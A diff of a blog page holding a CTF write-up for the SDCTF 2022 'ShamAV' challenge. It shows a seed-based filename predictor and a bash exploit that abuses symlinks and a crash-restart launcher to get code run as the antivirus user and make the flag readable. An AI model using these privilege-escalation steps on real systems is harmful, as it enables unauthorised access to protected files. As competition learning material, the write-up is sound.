@@ -15,10 +15,10 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="0x0 IntroductionWe just developed a new anti-virus called ShamAV. Have fun! Connect viasocat FILE:tty,raw,echo&#x3D;0 TCP:shamav.sdc.tf:1337 Flag path (Unix permission of flag is intended)&#x2F;home&amp;#">
 <meta property="og:type" content="website">
@@ -27,14 +27,13 @@
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
 <meta property="og:description" content="0x0 IntroductionWe just developed a new anti-virus called ShamAV. Have fun! Connect viasocat FILE:tty,raw,echo&#x3D;0 TCP:shamav.sdc.tf:1337 Flag path (Unix permission of flag is intended)&#x2F;home&amp;#">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-05-10T01:39:00.000Z">
-<meta property="article:modified_time" content="2022-05-10T01:39:00.000Z">
+<meta property="article:published_time" content="2022-05-09T10:39:00.000Z">
+<meta property="article:modified_time" content="2022-05-09T10:39:00.000Z">
 <meta property="article:author" content="Aynakeya">
 <meta name="twitter:card" content="summary">
 
 
 <link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/shamav/">
-
 
 
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/shamav/index.html","path":"ctf-writeup/2022/sdctf/pwn/shamav/index.html","title":"[Pwn] ShamAV [SDCTF 2022]"}</script>
@@ -46,6 +45,27 @@
 
 
 
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -105,25 +125,25 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -160,7 +180,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -171,7 +191,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">98</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -243,13 +263,32 @@
 <p>After than, we crash <code>server.py</code>, let <code>launcher.sh</code> to restart <code>server.py</code> and execute our code.</p>
 <h1 id="0x3-Walk-through"><a href="#0x3-Walk-through" class="headerlink" title="0x3 Walk through"></a>0x3 Walk through</h1><h2 id="first-glance"><a href="#first-glance" class="headerlink" title="first glance"></a>first glance</h2><p>challenge only provide a host and port, no other thing. But I can get everything I need through the shell.</p>
 <p>connect to server, firstly I checked the permission of the flag.txt. flag.txt is owned by antivirus, but didn&#39;t have any permission. So, I need find a way to change the permission and read the flag.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ctf@SHAMAV:~$ whoami</span><br><span class="line">ctf</span><br><span class="line">ctf@SHAMAV:~$ ls -al /home/antivirus</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 antivirus antivirus  200 May 10 04:27 .</span><br><span class="line">drwxr-xr-x 5 nobody    nogroup   4096 May  4 23:22 ..</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus  697 May 10 04:27 av.log</span><br><span class="line">---------- 1 antivirus antivirus   44 May 10 04:27 flag.txt</span><br><span class="line">-rwxr-xr-x 1 antivirus antivirus  673 May 10 04:27 launcher.sh</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus  260 May 10 04:27 malware-hashes.txt</span><br><span class="line">drwxrwxrwx 2 antivirus antivirus   40 May 10 04:27 quarantine</span><br><span class="line">-rw------- 1 antivirus antivirus   45 May 10 04:27 seed</span><br><span class="line">-rwxr-xr-x 1 antivirus antivirus 2643 May 10 04:27 server.py</span><br><span class="line">srwxrwxrwx 1 antivirus antivirus    0 May 10 04:27 socket</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ctf@SHAMAV:~$ whoami
+ctf
+ctf@SHAMAV:~$ ls -al &#x2F;home&#x2F;antivirus
+total 28
+drwxr-xr-x 3 antivirus antivirus  200 May 10 04:27 .
+drwxr-xr-x 5 nobody    nogroup   4096 May  4 23:22 ..
+-rw-r--r-- 1 antivirus antivirus  697 May 10 04:27 av.log
+---------- 1 antivirus antivirus   44 May 10 04:27 flag.txt
+-rwxr-xr-x 1 antivirus antivirus  673 May 10 04:27 launcher.sh
+-rw-r--r-- 1 antivirus antivirus  260 May 10 04:27 malware-hashes.txt
+drwxrwxrwx 2 antivirus antivirus   40 May 10 04:27 quarantine
+-rw------- 1 antivirus antivirus   45 May 10 04:27 seed
+-rwxr-xr-x 1 antivirus antivirus 2643 May 10 04:27 server.py
+srwxrwxrwx 1 antivirus antivirus    0 May 10 04:27 socket<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>then I looked at the <code>scan</code> file under &#x2F;home&#x2F;ctf&#x2F;bin. uhhh, its just a script, and how <code>scan</code> works is sending file path to a socket, then retrieve result from that socket. </p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># basically this file</span></span><br><span class="line">(<span class="built_in">echo</span> -n <span class="string">&quot;file_path&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span>)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># basically this file</span>
+<span class="token punctuation">(</span>echo <span class="token parameter variable">-n</span> <span class="token string">"file_path"</span> <span class="token operator">|</span> socat - <span class="token string">"UNIX-CONNECT:/home/antivirus/socket"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>if we scan a file, the file will be copy to <code>/home/antivirus/quarantine</code> with a random generated name. Moreover, this file is owned by <code>antivirus</code>!</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf@SHAMAV:~/virus-samples$ scan phishing.py</span><br><span class="line">ctf@SHAMAV:~/virus-samples$ ls -al /home/antivirus/quarantine</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx 2 antivirus antivirus  60 May 10 04:37 .</span><br><span class="line">drwxr-xr-x 3 antivirus antivirus 200 May 10 04:27 ..</span><br><span class="line">-rw-r--r-- 1 antivirus antivirus 177 May 10 04:37 sham-av-8a8b989c85011653db080d7e26f7175c04a9772c5845884a2e86c42fb3f17df6</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ctf@SHAMAV:~&#x2F;virus-samples$ scan phishing.py
+ctf@SHAMAV:~&#x2F;virus-samples$ ls -al &#x2F;home&#x2F;antivirus&#x2F;quarantine
+total 4
+drwxrwxrwx 2 antivirus antivirus  60 May 10 04:37 .
+drwxr-xr-x 3 antivirus antivirus 200 May 10 04:27 ..
+-rw-r--r-- 1 antivirus antivirus 177 May 10 04:37 sham-av-8a8b989c85011653db080d7e26f7175c04a9772c5845884a2e86c42fb3f17df6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>lets analysis two file that are responsible for the antivirus system. <a href="server.py"><code>server.py</code></a> and <a href="launcher.sh"><code>launcher.sh</code></a></p>
 <p><strong><a href="server.py">server.py</a></strong></p>
@@ -264,7 +303,11 @@
 <li>restart server.py if server.py crash.</li>
 </ul>
 <p>filename is generate by following function, so if I know the seed, I can predict the filename that will be generated in the future.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">genrandom</span>():</span><br><span class="line">    <span class="keyword">global</span> ctr</span><br><span class="line">    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder=<span class="string">&#x27;little&#x27;</span>) + seed).hexdigest()</span><br><span class="line">    ctr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">genrandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> ctr
+    result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>ctr<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span>CTR_LENGTH<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token operator">+</span> seed<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    ctr <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="the-idea"><a href="#the-idea" class="headerlink" title="the idea"></a>the idea</h2><p>I come up with following basic idea</p>
 <ol>
@@ -286,10 +329,43 @@
 <li><code>launcher.sh</code> will execute code and I can cat flag.</li>
 </ol>
 <h1 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h1><p>file_name_predict.py</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64, socket, os, hashlib, shutil, sys</span><br><span class="line">USER_UID = <span class="number">1002</span></span><br><span class="line">CTR_LENGTH = <span class="number">256</span></span><br><span class="line">STDIO_DEBUG = <span class="literal">False</span></span><br><span class="line">seed = <span class="string">&quot;ZFhtPShqL2BjJQw7MwAPBjEwMolJ6qndj4v9v+2vEK8=&quot;</span> <span class="comment"># seed from seed file</span></span><br><span class="line">ctr = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">seed = base64.b64decode(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genrandom</span>():</span><br><span class="line">    <span class="keyword">global</span> ctr</span><br><span class="line">    result = hashlib.sha256(ctr.to_bytes(CTR_LENGTH, byteorder=<span class="string">&#x27;little&#x27;</span>) + seed).hexdigest()</span><br><span class="line">    ctr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;/home/antivirus/quarantine/sham-av-<span class="subst">&#123;genrandom()&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python3</span>
+<span class="token keyword">import</span> base64<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> os<span class="token punctuation">,</span> hashlib<span class="token punctuation">,</span> shutil<span class="token punctuation">,</span> sys
+USER_UID <span class="token operator">=</span> <span class="token number">1002</span>
+CTR_LENGTH <span class="token operator">=</span> <span class="token number">256</span>
+STDIO_DEBUG <span class="token operator">=</span> <span class="token boolean">False</span>
+seed <span class="token operator">=</span> <span class="token string">"ZFhtPShqL2BjJQw7MwAPBjEwMolJ6qndj4v9v+2vEK8="</span> <span class="token comment"># seed from seed file</span>
+ctr <span class="token operator">=</span> <span class="token number">0</span>
+
+seed <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">genrandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> ctr
+    result <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>ctr<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span>CTR_LENGTH<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span> <span class="token operator">+</span> seed<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    ctr <span class="token operator">+=</span> <span class="token number">1</span>
+    <span class="token keyword">return</span> result
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/home/antivirus/quarantine/sham-av-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>genrandom<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/home/antivirus/quarantine/sham-av-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>genrandom<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/home/antivirus/quarantine/sham-av-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>genrandom<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>exploit</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /home/antivirus/seed /home/ctf/seed</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/seed&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /home/antivirus/server.py /home/antivirus/quarantine/sham-av-b5d2c8eb62cf9108369b50d1f4a5928821b2e28f3b5606009285a502c96c1a8f <span class="comment"># the predict filename</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;#! /usr/bin/env python3\nimport os\nos.system(&#x27;chmod 777 flag.txt&#x27;)&quot;</span> &gt; /home/ctf/x</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/x&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /home/antivirus/quarantine</span><br><span class="line"><span class="built_in">cat</span> /home/antivirus/server.py</span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -s /home/antivirus/flag.txt /home/ctf/flag.txt</span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;/home/ctf/flag.txt&quot;</span> | socat - <span class="string">&quot;UNIX-CONNECT:/home/antivirus/socket&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -al /home/antivirus/</span><br><span class="line"><span class="built_in">cat</span> /home/antivirus/flag.txt</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/antivirus/seed /home/ctf/seed
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"/home/ctf/seed"</span> <span class="token operator">|</span> socat - <span class="token string">"UNIX-CONNECT:/home/antivirus/socket"</span>
+
+<span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/antivirus/server.py /home/antivirus/quarantine/sham-av-b5d2c8eb62cf9108369b50d1f4a5928821b2e28f3b5606009285a502c96c1a8f <span class="token comment"># the predict filename</span>
+
+<span class="token builtin class-name">printf</span> <span class="token string">"#! /usr/bin/env python3<span class="token entity" title="\n">\n</span>import os<span class="token entity" title="\n">\n</span>os.system('chmod 777 flag.txt')"</span> <span class="token operator">></span> /home/ctf/x
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"/home/ctf/x"</span> <span class="token operator">|</span> socat - <span class="token string">"UNIX-CONNECT:/home/antivirus/socket"</span>
+
+<span class="token function">ls</span> <span class="token parameter variable">-al</span> /home/antivirus/quarantine
+<span class="token function">cat</span> /home/antivirus/server.py
+
+<span class="token function">ln</span> <span class="token parameter variable">-s</span> /home/antivirus/flag.txt /home/ctf/flag.txt
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">"/home/ctf/flag.txt"</span> <span class="token operator">|</span> socat - <span class="token string">"UNIX-CONNECT:/home/antivirus/socket"</span>
+
+<span class="token function">ls</span> <span class="token parameter variable">-al</span> /home/antivirus/
+<span class="token function">cat</span> /home/antivirus/flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{5ymL1Nks_ar3_4_curs3d_f3a7uRe_0f_*NIX}</p>
 
@@ -318,7 +394,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -345,28 +421,6 @@
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 
 </body>
 </html>
